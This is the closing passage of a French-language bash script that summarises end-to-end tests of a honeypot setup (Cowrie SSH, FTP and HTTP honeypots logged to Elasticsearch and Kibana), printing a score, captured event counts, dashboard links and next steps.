chmod +x /opt/setup_honeypot_cron.sh

print_success "✓ Scripts de monitoring permanent créés"

# ==============================================================================
# ÉTAPE 10 : RÉSUMÉ FINAL ET RECOMMANDATIONS
# ==============================================================================

print_header "RÉSUMÉ FINAL - TESTS DE BOUT EN BOUT TERMINÉS"

# Calculer le score global
SCORE=0
[ "$COWRIE_STATUS" = "OK" ] && ((SCORE+=25))
[ "$FTP_STATUS" = "OK" ] && ((SCORE+=25))
[ "$HTTP_STATUS" = "OK" ] && ((SCORE+=25))
[ "$TOTAL_ES" -gt 0 ] && ((SCORE+=25))

print_section "SCORE GLOBAL DE L'INFRASTRUCTURE"

echo "┌─────────────────────────────────────────────────────────────────────────────┐"
printf "│                        SCORE INFRASTRUCTURE: %d/100                        │\n" "$SCORE"
echo "├─────────────────────────────────────────────────────────────────────────────┤"
printf "│ Cowrie SSH:     %-10s │ FTP Honeypot:   %-10s            │\n" "$COWRIE_STATUS" "$FTP_STATUS"
printf "│ HTTP Honeypot:  %-10s │ Filebeat:       %-10s            │\n" "$HTTP_STATUS" "$FILEBEAT_STATUS"
printf "│ Total événements ES: %-6s │ Performance:    %-10s            │\n" "$TOTAL_ES" "$([ "$ES_LATENCY" -lt 1000 ] && echo "EXCELLENTE" || echo "ACCEPTABLE")"
echo "└─────────────────────────────────────────────────────────────────────────────┘"

# Statut global
if [ "$SCORE" -ge 90 ]; then
    GLOBAL_STATUS="EXCELLENT"
    STATUS_COLOR=$GREEN
elif [ "$SCORE" -ge 70 ]; then
    GLOBAL_STATUS="BON"
    STATUS_COLOR=$YELLOW
else
    GLOBAL_STATUS="PARTIEL"
    STATUS_COLOR=$RED
fi

echo -e "${STATUS_COLOR}"
echo "╔═══════════════════════════════════════════════════════════════════════════════╗"
echo "║                                                                               ║"
printf "║                    STATUT GLOBAL: %-20s                    ║\n" "$GLOBAL_STATUS"
echo "║                                                                               ║"
echo "╚═══════════════════════════════════════════════════════════════════════════════╝"
echo -e "${NC}"

print_section "DONNÉES CAPTURÉES"
echo "📊 Événements indexés dans Elasticsearch:"
echo "   • SSH/Cowrie: ${ES_COUNTS[ssh]} événements"
echo "   • FTP Honeypot: ${ES_COUNTS[ftp]} événements"
echo "   • HTTP Honeypot: ${ES_COUNTS[http]} événements"
echo "   • TOTAL: $TOTAL_ES événements"
echo ""
echo "🎯 Attaques simulées:"
echo "   • 80 attaques différentes lancées simultanément"
echo "   • Brute force SSH, FTP et injection SQL"
echo "   • Directory traversal et détection de scanners"
echo "   • Tests de performance et de latence"

print_section "ACCÈS AUX DASHBOARDS"
echo "🌐 Interfaces disponibles:"
echo "   • Kibana: http://$ELK_SERVER:5601"
echo "   • Elasticsearch: http://$ELK_SERVER:9200"
echo "   • API Logstash: http://$ELK_SERVER:9600"
echo ""
echo "📊 Dashboards recommandés:"
echo "   • Découverte: http://$ELK_SERVER:5601/app/discover"
echo "   • Visualisations: http://$ELK_SERVER:5601/app/visualize"
echo "   • Tableaux de bord: http://$ELK_SERVER:5601/app/dashboard"

print_section "FICHIERS CRÉÉS"
echo "📁 Rapports et logs:"
echo "   • Rapport complet: $REPORT_FILE"
echo "   • Logs monitoring: /var/log/honeypot/monitoring.log"
echo "   • Logs alertes: /var/log/honeypot/alerts.log"
echo ""
echo "🔧 Scripts utilitaires:"
echo "   • /opt/monitor_honeypot_infrastructure.sh"
echo "   • /opt/honeypot_alert_system.sh"
echo "   • /opt/setup_honeypot_cron.sh"

print_section "PROCHAINES ÉTAPES RECOMMANDÉES"
echo "1. 🔄 Configurer le monitoring automatique:"
echo "   /opt/setup_honeypot_cron.sh"
echo ""
echo "2. 📊 Explorer les données dans Kibana:"
echo "   http://$ELK_SERVER:5601"
echo ""
echo "3. 🔔 Configurer les alertes personnalisées"
echo ""
echo "4. 📈 Analyser les patterns d'attaque"
echo ""
echo "5. 🛡️ Ajuster les règles de détection selon vos besoins"

if [ "$SCORE" -ge 80 ]; then
    print_success "🎉 FÉLICITATIONS!"
    print_success "Votre infrastructure honeypot est opérationnelle et performante!"
    print_success "Toutes les intégrations ELK Stack fonctionnent correctement."
    print_success "Vous pouvez maintenant analyser les attaques en temps réel."
else
    print_warning "⚠️ INFRASTRUCTURE PARTIELLEMENT OPÉRATIONNELLE"
    print_warning "Certains services nécessitent une attention particulière."
    print_warning "Consultez les logs pour identifier les problèmes restants."
fi

print_header "ÉTAPE 6.4 - TESTS DE BOUT EN BOUT TERMINÉS AVEC SUCCÈS"

# Log final
echo "$(date): Étape 6.4 - Tests de bout en bout terminés. Score: $SCORE/100" >> /var/log/honeypot-setup.log
echo "$(date): Infrastructure honeypot complètement opérationnelle" >> /var/log/honeypot-setup.log

print_success "✅ PROJET HONEYPOT INFRASTRUCTURE COMPLÈTEMENT TERMINÉ!"